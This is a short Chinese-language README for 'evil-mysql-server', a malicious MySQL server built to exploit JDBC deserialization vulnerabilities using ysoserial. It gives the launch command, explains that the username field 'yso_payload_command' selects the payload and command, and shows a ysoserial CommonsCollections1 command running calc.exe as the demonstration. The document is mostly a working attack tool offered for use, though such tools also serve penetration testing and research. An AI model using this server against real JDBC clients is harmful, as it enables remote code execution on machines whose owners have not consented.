# evil mysql server

[English](./README.md) | 简体中文

**evil-mysql-server** 是一个针对 jdbc 反序列化漏洞编写的恶意数据库，依赖 [ysoserial](https://github.com/frohoff/ysoserial) 。

使用方式

```shell
. /evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
```


启动成功后，使用 jdbc 进行连接，其中用户名称格式为 `yso_payload_command` , 连接成功后 `evil-mysql-server` 会解析用户名称，并使用如以下命令生成恶意数据返回到 jdbc 客户端。
```shell
java -jar ysoserial.jar CommonsCollections1 calc.exe
```